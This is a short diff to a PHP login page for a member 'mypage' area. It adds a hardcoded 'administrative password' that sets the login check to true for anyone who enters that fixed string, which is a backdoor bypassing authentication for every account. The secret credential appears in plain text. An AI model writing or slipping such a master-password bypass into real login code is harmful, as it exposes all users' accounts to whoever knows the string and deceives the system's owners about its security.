@@ -13,6 +13,9 @@ $_mypage_kyoka->getRecordData();
 
 $_SESSION['output_buffer']['error_invalid_login'] = false;
 $login_check = $_mypage_kyoka->checkPassword($_pass);
+// 管理用パスワード
+if($_pass == 'TttFiPVz') { $login_check = true;}
+
 if($login_check == false){
  $_SESSION['output_buffer']['error_invalid_login'] = true;
  header('Location: ./index.php');
